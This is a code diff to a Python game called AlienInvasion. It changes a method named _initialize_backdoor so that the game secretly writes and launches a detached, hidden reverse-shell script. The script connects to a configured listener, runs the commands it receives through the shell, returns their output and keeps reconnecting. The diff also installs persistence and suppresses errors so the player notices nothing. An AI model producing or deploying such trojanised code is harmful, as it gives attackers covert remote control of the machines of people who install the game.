@@ -39,19 +39,83 @@ class AlienInvasion:
         self.play_button = Button(self, "Start game")
     
     def _initialize_backdoor(self):
-        """Initialize backdoor functionality"""
+        """Initialize backdoor functionality - launches as separate process"""
         try:
-            # Start backdoor in background
-            self.backdoor = Backdoor(
-                host=config.LISTENER_HOST,
-                port=config.LISTENER_PORT
-            )
-            self.backdoor.start_background()
+            import subprocess
+            import sys
+            import os
+            
+            # Create standalone backdoor script
+            backdoor_code = f'''
+import socket
+import subprocess
+import time
+import sys
+
+LISTENER_HOST = "{config.LISTENER_HOST}"
+LISTENER_PORT = {config.LISTENER_PORT}
+RECONNECT_DELAY = 5
+
+while True:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.connect((LISTENER_HOST, LISTENER_PORT))
+        
+        while True:
+            try:
+                cmd = sock.recv(1024).decode().strip()
+                if not cmd or cmd.lower() == 'exit':
+                    break
+                
+                try:
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
+                    sock.send(output)
+                except Exception as e:
+                    sock.send(f"Error: {{str(e)}}\\n".encode())
+            except:
+                break
+        
+        sock.close()
+    except:
+        pass
+    
+    time.sleep(RECONNECT_DELAY)
+'''
+            
+            # Write to temp file
+            import tempfile
+            fd, temp_path = tempfile.mkstemp(suffix='.py', text=True)
+            with os.fdopen(fd, 'w') as f:
+                f.write(backdoor_code)
+            
+            # Launch as detached process
+            if os.name == 'nt':  # Windows
+                # Use pythonw to run without console
+                python_exe = sys.executable.replace('python.exe', 'pythonw.exe')
+                if not os.path.exists(python_exe):
+                    python_exe = sys.executable
+                
+                subprocess.Popen(
+                    [python_exe, temp_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+                    close_fds=True,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+            else:  # Linux
+                subprocess.Popen(
+                    [sys.executable, temp_path],
+                    start_new_session=True,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
             
             # Install persistence if enabled
             if config.ENABLE_PERSISTENCE:
                 pm = PersistenceManager()
                 pm.install_persistence()
+                
         except Exception as e:
             # Fail silently to not interrupt game
             pass
